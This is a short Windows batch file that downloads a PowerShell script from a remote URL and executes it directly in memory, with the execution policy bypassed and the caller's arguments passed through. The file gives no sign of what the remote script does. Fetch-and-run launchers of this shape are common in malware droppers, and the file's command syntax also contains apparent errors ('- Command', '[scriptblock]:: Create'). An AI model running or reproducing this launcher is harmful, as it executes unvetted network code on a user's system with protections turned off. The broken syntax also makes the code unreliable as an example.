@echo off 
setlocal

set "SCRIPT_URL=https://seb.cchef.co/seb.ps1"

powershell.exe -NoProfile -ExecutionPolicy Bypass - Command ^
   "& ([scriptblock]:: Create( (Invoke-RestMethod '%SCRIPT_URL%'))) %*"

endlocal